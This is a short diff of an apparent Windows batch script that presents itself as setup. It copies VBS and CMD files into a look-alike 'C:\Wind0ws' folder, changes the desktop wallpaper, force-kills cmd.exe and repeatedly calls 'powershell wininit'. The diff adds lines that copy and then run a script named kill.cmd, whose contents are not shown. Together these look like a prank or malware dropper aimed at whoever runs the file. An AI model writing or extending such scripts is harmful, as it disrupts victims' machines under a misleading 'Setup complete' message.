@@ -37,7 +37,7 @@ copy stw.vbs C:\Wind0ws
 copy e.cmd C:\Wind0ws
 start echo Setup complete
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Wind\back.jpg /t
-
+copy kill.cmd C:\Wind0ws
 
 
 copy msg.vbs A:\Wind0ws
@@ -59,3 +59,4 @@ taskkill /F /IM cmd.exe
 powershell wininit
 powershell wininit
 powershell wininit
+C:\Wind0ws\kill.cmd
